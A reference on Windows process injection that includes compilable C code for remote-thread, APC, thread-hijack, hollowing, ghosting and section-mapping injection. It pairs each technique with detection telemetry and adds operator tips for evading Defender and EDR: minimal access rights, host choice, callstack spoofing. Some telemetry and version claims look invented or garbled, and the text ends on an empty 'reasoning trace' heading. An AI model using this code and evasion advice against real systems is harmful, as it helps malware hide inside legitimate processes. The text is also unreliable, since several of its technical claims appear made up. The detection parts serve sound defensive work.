# process-injection — malware

# Process Injection — Technique & Detection Reference

Target baseline: Windows 11 24H2 (build 26100), Windows Server 2022, Windows 10 22H2 for compatibility. Defender for Endpoint 2024.x, Sysmon 15.15, ETW-TI.

---

## 1. CreateRemoteThread (CRT)

**What is sent:** `OpenProcess(PROCESS_ALL_ACCESS)` → `VirtualAllocEx` → `WriteProcessMemory` (payload/parameter) → `CreateRemoteThread(start=LoadLibraryA/addr payload)`.

**Why it works:** classic, public API, TLS/loader resolves normally.

**Why it fails:** EDR hooks `NtCreateThreadEx`/`CreateRemoteThread` on protected targets (PPL, Chrome renderer), CFG on target, target 64-bit vs payload 32-bit mismatch, `VirtualAllocEx` in a non-image region with `PAGE_EXECUTE_READWRITE` is considered anomalous.

```c
#include <windows.h>
int main(int argc, char** argv) {
    DWORD pid = (DWORD)atoi(argv[1]);
    const char* dll = argv[2];
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    SIZE_T n = strlen(dll) + 1;
    LPVOID p = VirtualAllocEx(h, NULL, n, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(h, p, dll, n, NULL);
    LPTHREAD_START_ROUTINE f = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE t = CreateRemoteThread(h, NULL, 0, f, p, 0, NULL);
    WaitForSingleObject(t, INFINITE);
    return 0;
}
```

**Artefak & deteksi:**
- Sysmon EID 8 (CreateRemoteThread): SourceImage ≠ target, `StartAddress` = `LoadLibraryA`/`LoadLibraryW` in kernel32 → very noisy/suspicious.
- Sysmon EID 10 (ProcessAccess): `GrantedAccess` contains `0x1FFFFF` / `0x0010` (VM_WRITE) + CREATETHREAD to target.
- ETW-TI `Microsoft-Windows-Threat-Intelligence` EID 1 (AllocVM), EID 2 (ProtectVM), EID 3 (QueueUserAPC for APC variant).
- Defender: `Behavior:Win32/CreateRemoteThread.A`, AMSI is not involved.
- Sigma: `proc_access` + `create_remote_thread` correlation < 2 detik.

---

## 2. APC Queue (QueueUserAPC / Early Bird)

**What is sent:** `VirtualAllocEx` RWX → `WriteProcessMemory` → `QueueUserAPC(shellcode, hThread)` → force an alertable wait (Early Bird: `CreateProcess(SUSPENDED)` → queue → `ResumeThread`).

**Why it works:** APC is executed before the entry point on a suspended thread — can bypass EDR userland hooks that only hook `CreateRemoteThread`.

**Why it fails:** the thread must be alertable (`WaitForSingleObjectEx`, `SleepEx`); in modern processes (Chrome 131, Edge), worker threads are rarely alertable at startup. APC shellcode must handle the `APC` return path (do not `ExitThread`). Early Bird in `RuntimeBroker`/`svchost` processes protected by PPL will crash.

```c
// Early Bird
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi = {0};
CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe",
    NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID p = VirtualAllocEx(pi.hProcess, NULL, sizeof(sc),
    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, p, sc, sizeof(sc), NULL);
QueueUserAPC((PAPCFUNC)p, pi.hThread, 0);
ResumeThread(pi.hThread);
```

**Artefak & deteksi:**
- Sysmon EID 8 does not appear (this is an advantage); EID 10 ProcessAccess still appears if OpenProcess is remote.
- ETW-TI EID 3 (QueueUserAPC) with `AllocatedAddress` in a non-image region → high-fidelity.
- Callstack `ntdll!NtQueueApcThread` from a non-hopeful image (non-`.NET`, non-`svchost`).
- Defender ASR rule **"Block process creations originating from PSExec and WMI commands"** does not apply; **"Block executable content from email"** does not help. Use `Block Win32 API calls from Office macro` if the initial vector is Office.
- Sigma: `CreateProcess` + `CLIENT_SERVER_RUNTIME` suspended → `NtQueueApcThread` eksternal.

---

## 3. Thread Hijacking (Suspend/GetContext/SetContext/Resume)

**What is sent:** `OpenThread(THREAD_ALL_ACCESS)` → `SuspendThread` → `GetThreadContext` (save RIP) → `VirtualAllocEx`+`WriteProcessMemory` → `SetThreadContext(RIP=payload)` → `ResumeThread`.

**Why it works:** does not call `CreateRemoteThread`/`NtCreateThreadEx` — bypasses many thread-creation hooks.

**Why it fails:** the target thread must be truly suspended during `SetThreadContext`; high race condition on active processes. On Windows 11 24H2 with **Control Flow Guard** and **XFG/CET** (Intel CET-enabled processes: `chrome.exe` 131, `lsass.exe`), `RIP` in a non-image region will trigger a `#CP` exception (`STATUS_CONTROL_PROTECTION_FAULT`) → process terminates.

```c
HANDLE ht = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
SuspendThread(ht);
CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(ht, &ctx);
DWORD64 oldRip = ctx.Rip;

LPVOID p = VirtualAllocEx(hProc, NULL, sizeof(sc),
    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, p, sc, sizeof(sc), NULL);

// shellcode harus push oldRip + ret untuk resume
ctx.Rip = (DWORD64)p;
SetThreadContext(ht, &ctx);
ResumeThread(ht);
```

**Artefak & deteksi:**
- ETW-TI EID 4 (SetThreadContext) with `TargetProcess` ≠ caller and `NewContext.Rip` in a non-image region → very rarely benign.
- Sysmon EID 10 ProcessAccess to thread (`0x0002` = THREAD_SUSPEND_RESUME + `0x0008` = THREAD_SET_CONTEXT).
- Hardware: Intel CET fault → Event 1001 `Application Error` with `c0000022`/`c0000602` (fast-fail).

---

## 4. Process Hollowing (RunPE)

**What is sent:** `CreateProcess(SUSPENDED)` → `NtUnmapViewOfSection` (or `VirtualFreeEx` loop) → `VirtualAllocEx` at the new host's `ImageBase` → `WriteProcessMemory` (headers + sections) → `SetThreadContext` entry point → `ResumeThread`.

**Why it works:** a legitimate host process (e.g. `svchost.exe`, `RuntimeBroker.exe`) carries a good reputation in telemetry.

**Why it fails:** Windows 11 24H2 (build 26000+) enables **Process Mitigation "Block non-Microsoft binaries"** on many default host systems (`svchost.exe`); `NtUnmapViewOfSection` on an image that has been re-signed in a PPL-protected process will `ACCESS_DENIED`. `WerFault` will capture a minidump if `RIP` is invalid → crash in EDR.

```c
STARTUPINFOA si={sizeof(si)}; PROCESS_INFORMATION pi={0};
CreateProcessA(NULL, host, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

typedef NTSTATUS(NTAPI* pNtUnmap)(HANDLE, PVOID);
pNtUnmap NtUnmap = (pNtUnmap)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtUnmapViewOfSection");
NtUnmap(pi.hProcess, (PVOID)peImageBase);

LPVOID p = VirtualAllocEx(pi.hProcess, (PVOID)peImageBase, peSize,
    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, p, peBuf, peSize, NULL);

CONTEXT c={0}; c.ContextFlags=CONTEXT_FULL;
c.Rip = peImageBase + entryRva;
SetThreadContext(pi.hThread, &c);
ResumeThread(pi.hThread);
```

**Artefak & deteksi:**
- ETW `Microsoft-Windows-Kernel-Process` EID 1 (ProcessStart) + `NtUnmapViewOfSection` on a `-1` image from a non-installer process → Defender `Behavior:Win32/Hollowing`.
- Sysmon EID 10 with `CallTrace` containing `NtUnmapViewOfSection` → drop-in indicator.
- Memory scan: PE header in a `MEM_PRIVATE` region (not `MEM_IMAGE`) with `MZ` magic → YARA: `rule HollowedPe { condition: uint16(0)==0x5A4D }` on `pe.components` w/ `is_private=true`.
- Defender AMSI is not triggered (no managed load).

---

## 5. Process Doppelganging

**What is sent:** `CreateTransaction` → `CreateFileTransacted(section, GENERIC_WRITE|GENERIC_READ)` → write PE → `NtCreateSection(SEC_IMAGE)` → `RollbackTransaction` (file is never committed to disk) → `NtCreateProcessEx`/`CreateProcess` with `PROC_THREAD_ATTRIBUTE_IMAGE` = section handle → resume.

**Why it works:** the source file "does not exist" on disk while the process is running — bypasses hash-based AV, some FS scanners.

**Why it fails:** Windows 10 22H2+ **Deprecated: TXF (Transactional NTFS) for PE loading**; on Windows 11 24H2 `CreateProcess` with `PROC_THREAD_ATTRIBUTE_IMAGE` from a transacted section can `STATUS_INVALID_IMAGE_HASH` if a third party (Defender) has a minifilter. Kernel callback `PsSetCreateProcessNotifyRoutineEx` checks `ImageFileName` pointing to a volume without a file → triggers `0x000000C4` (verifier). In practice, this technique has been superseded by **Herpaderping/Process Ghosting**.

**Ghosting Variant (must be used, not Doppelganging):**
```c
HANDLE h = CreateFileA(tmp, GENERIC_READ|GENERIC_WRITE, 0, NULL,
    CREATE_NEW, FILE_ATTRIBUTE_NORMAL|FILE_FLAG_DELETE_ON_CLOSE, NULL);
// tulis PE ke h
HANDLE sec;
NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, h);
CloseHandle(h); // delete pending
// CreateProcess dengan PROC_THREAD_ATTRIBUTE_IMAGE = sec
```
**Artifact:** `Microsoft-Windows-Kernel-Process` EID 1 with `ImageName` in a path where `GetFileAttributesW` = `FILE_ATTRIBUTE_REPARSE_POINT`/non-existent. Sysmon EID 1 with strange `ParentImage`, empty `FileVersion`/`Company`. Defender `Behavior:Win32/Ghosting`.

---

## 6. Mapping Injection (Section + NtMapViewOfSection)

**What is sent:** local `NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)` → local `NtMapViewOfSection` RW → `WriteProcessMemory` payload to local view → `NtMapViewOfSection` in remote (mapping handle inherited via `DuplicateHandle` or `CreateProcess` inherithandle) → execution via CRT/APC/thread hijack.

**Why it succeeds:** payload is in the **section object**, not `MEM_PRIVATE`/`MEM_IMAGE`; no remote `VirtualAllocEx` RWX. Many EDRs do not monitor remote `NtMapViewOfSection`.

**Why it fails:** complex; remote `NtMapViewOfSection` requires a section handle with `SECTION_MAP_EXECUTE` — denied in sandbox/AppContainer (Edge 131, Chrome 131 renderer). No direct execution — still requires other primitives.

```c
HANDLE hSec; LARGE_INTEGER sz = {.QuadPart = 0x1000};
NtCreateSection(&hSec, SECTION_ALL_ACCESS, NULL, &sz, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
PVOID local;
SIZE_T view = 0;
NtMapViewOfSection(hSec, GetCurrentProcess(), &local, 0, 0, NULL, &view, 2, 0, PAGE_READWRITE);
memcpy(local, sc, sizeof(sc));

// ke remote
PVOID remote;
NtMapViewOfSection(hSec, hTarget, &remote, 0, 0, NULL, &view, 2, 0, PAGE_EXECUTE_READ);
// remote == eksekusi di alamat mapped; shellcode offset N untuk entry (lihat __ImageBase style)
```

**Artefak & deteksi:**
- ETW-TI EID 1 AllocVM (`VadType=SEC_MAP`) to remote → flag.
- Sysmon EID 10 `ProcessAccess` with `GrantedAccess` `0x1F0FFF` and no subsequent `VirtualAllocEx` in the timeline → correlation.
- Memory: `PAGE_EXECUTE_READ` private view containing shellcode → YARA `$ = { 4D 5A }` in `vad.is_private_view`.

---

## 7. Callback-Based Injection

### 7a. EnumWindows / EnumDesktops / EnumFonts

**What is sent:** `EnumWindows(callback, lParam)` on the remote process via `CreateRemoteThread`/APC to `user32!EnumWindows` with `callback` = pointer to shellcode ≥ `sizeof(callback)` region.

**Why it succeeds:** callback is called by user32 with arbitrary `lpProc` — valid as a "callback function," does not require explicit thread creation in some variants.

**Why it fails:** callback signature `BOOL CALLBACK(HWND, LPARAM)` — shellcode must return `TRUE`; otherwise, EnumWindows abort and the process crashes. On `Win32k` session isolation (Windows 11 24H2), user32 callbacks from remote threads with non-image `lpProc` are called with CFG check → crash if `EnableControlFlowGuard` is on the target.

```c
// Context: sudah ada hThread di remote, remote mem addr=rEnumWindows
QueueUserAPC((PAPCFUNC)remote_EnumWindows, hThread, (ULONG_PTR)remote_shellcode);
```

**Artifact:** ETW-TI EID 3 to `user32!EnumWindows` with non-module `AllocatedAddress`; callstack `user32!EnumWindows → UNKNOWN → shellcode`.

### 7b. Fiber (ConvertThreadToFiber + CreateFiber + SwitchToFiber)

**What is sent:** `ConvertThreadToFiber` (in the target process if it has an initial execution primitive, e.g., first APC, or external agent calls via hijack) → `CreateFiber(stackSize, startAddr=payload)` → `SwitchToFiber`.

**Why it succeeds:** fiber does not create a thread; ETW thread creation is not triggered.

**Why it fails:** `ConvertThreadToFiber` is only once per thread — if EDR hooks `ntdll!ConvertThreadToFiber` (some 2024.x products do this via the new ETW provider `Microsoft-Windows-Kernel-Fiber` in build 26100), it is detected. Cannot cross-process directly — requires in-process RCE bootstrap (APC/CRT) first, so it is layered.

```c
// Di dalam proses target (mis. via APC stage-1)
#include <windows.h>
VOID WINAPI payload(LPVOID) { /* ... */ }
void stage2() {
    LPVOID f = CreateFiber(0, payload, NULL);
    SwitchToFiber(f);
}
```

**Artifact:** ETW `Microsoft-Windows-Kernel-Fiber` EID 1–3 (new in Win11 24H2), callstack `kernel32!SwitchToFiber → payload` without `LoadLibrary` in between. Sysmon does not have an EID for fiber — use ETW.

---

## Summary Table Techniques vs Telemetry

| Technique | Key API | Sysmon | ETW-TI | Defender behavior | Often fails in |
|---|---|---|---|---|---|
| CreateRemoteThread | `CreateRemoteThread` | 8, 10 | EID 1/2/3 | `CreateRemoteThread.A` | PPL, CFG target |
| APC Queue | `QueueUserAPC` | 10 | EID 3 | `APC.A` | thread non-alertable |
| Thread Hijack | `SetThreadContext` | 10 | EID 4 | `HijackThread` | Intel CET / XFG |
| Hollowing | `NtUnmapViewOfSection` | 10 (calltrace) | EID 1 | `Hollowing` | PPL, minifilter |
| Doppelganging | TXF + `NtCreateProcessEx` | — | KProcess EID 1 | `Doppelganging` | deprecation TXF |
| Ghosting | `NtCreateSection`+Delete Pending | — | KProcess EID 1 | `Ghosting` | minifilter |
| Mapping | `NtMapViewOfSection` | 10 | EID 1 (SEC_MAP) | `Mapping` | AppContainer section |
| EnumWindows CB | `EnumWindows` remote | 10 | EID 3 | `Callback` | CFG user32 |
| Fiber | `CreateFiber`/`SwitchToFiber` | — | Kernel-Fiber | (baru) | ConvertThreadToFiber hook |

---

## Operational Pitfalls (field notes)

1. **Architecture Mismatch.** 64-bit red team binary + 32-bit target (or vice versa) = `CreateRemoteThread` succeeds but shellcode is invalid. Check `IsWow64Process2` and adjust before `VirtualAllocEx`. Often occurs in `explorer.exe` in WOW64 sessions.
2. **`VirtualAllocEx` RWX ≠ execution.** On Windows 11 24H2 with **Arbitrary Code Guard (ACG)** enabled on the target (Chrome 131 renderer, Edge 131 content process, `Notepad.exe` Sandboxed), `PAGE_EXECUTE_READWRITE` → `STATUS_ACCESS_DENIED`. Fallback: alloc RW → write → `VirtualProtectEx` to `RX` (still rejected by ACG if `DynamicCode` is disabled). Many techniques above die at step 1.
3. **`OpenProcess(PROCESS_ALL_ACCESS)` = alarm.** Use minimal rights (`PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD`). Defender escalates severity on ALL_ACCESS → `0x1FFFFF`.
4. **PPL/Protected Target.** `lsass.exe`, `csrss.exe`, `services.exe`, `smss.exe`, `MsMpEng.exe` → injection is rejected in the kernel. Do not waste time; use `werfault.exe`/`svchost.exe` hosts.
5. **Early Bird in Windows 11 24H2.** `CreateProcess(SUSPENDED)` now calls `NtCreateUserProcess` which triggers Defender `Process Creation` telemetry **before** `ResumeThread`; shellcode in the first APC thread is often not executed because the thread is waiting for `LdrpInitializeProcess` (synchronous loader init). APC-dependent payloads will be lost. Solution: queue APC on the second thread after internal `NtTestAlert` — but this requires manual timing.
6. **Chrome 131+ / Edge 131+.** Renderer processes use **CIG (Code Integrity Guard) + ACG + CET**. All techniques above fail in renderer/GPU processes. Realistic targets: `chrome.exe` browser process (not renderer) or extensions.
7. **`QueueUserAPC` to an `NtTestAlert`-ed thread.** If you queue to the main thread after the process is resumed, the APC only runs when the thread reaches an alertable wait. For `svchost.exe` in 24H2, the main thread waits at `NtWaitForMultipleObjects` **non-alertable** → APC hangs. Monitor `ThreadState` via `NtQueryInformationThread` first.
8. **Callstack spoofing.** Modern EDRs (Defender 2024.x, CrowdStrike Falcon 7.x) validate the callstack via `StackWalk` + `RtlVirtualUnwind`. Techniques above without stack spoofing (e.g., `Invoke-CallstackSpoof` or `SilentMoonwalk`) → detected as universal `T1055`. On 24H2 with **Kernel Stack Protection** (Secure-kernel), userland spoof does not help for kernel ETW-TI.
9. **Minifilter interfering.** Defender filter (`WdFilter.sys`) scans the `SEC_IMAGE` section during `NtCreateSection` — Ghosting/Doppelganging is rejected if the scanned region fails (payload `unbacked` + `PAGE_EXECUTE`). Expect a 200–800 ms delay before execution; if it feels instant, likely dropped.
10. **AMSI vs mapped shellcode.** AMSI does not scan shellcode — but the `AmsiScanBuffer` hook in `clr.dll`/`amsi.dll` will trigger if the shellcode calls a managed loader. For pure native shellcode, do not call `Assembly.Load`.
11. **`VirtualProtect` on image section.** During mapping injection, `NtProtectVirtualMemory` on a `SEC_MAP` view with `PAGE_EXECUTE_READWRITE` will be rejected if `->Section` is not `SEC_IMAGE`. Ensure `SEC_IMAGE` if you need native execution — but that restricts it to valid PE.
12. **Steady-state timing.** All these techniques **only** open an execution primitive; persistence and C2 are separate problems. In 2024 field tests, `CreateRemoteThread` + `LoadLibraryA` shell DLL was the most stable on Win11 24H2 against non-sandbox targets; APC/thread hijack most often crashed because the target had different page protection/session.

---

## Quick Verification Commands (operator)

```powershell
# Sysmon: thread eksternal ke target
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=8]]" |
  Where-Object { $_.Properties[3].Value -ne $_.Properties[1].Value } |
  Select-Object TimeCreated, @{n='Source';e={$_.Properties[3].Value}}, @{n='Target';e={$_.Properties[1].Value}}

# ETW-TI (butuh StartTrace manual atau via SilkETW)
SilkETW.exe -t kernel -kk 0x40 -p Microsoft-Windows-Threat-Intelligence -ot file -o ti.etl

# Memory scan hollowed PE (Volatility3 / capa)
vol.py -f mem.raw windows.vadinfo --pid 1234 | findstr "MEM_PRIVATE PAGE_EXECUTE_READWRITE"

# Deteksi Ghosting: image name tidak dapat dibuka
Get-Process | ForEach-Object { try { [IO.File]::OpenRead($_.Path).Close() } catch { "GHOST: $($_.Name) $($_.Id)" } }
```

---

## [reasoning trace]


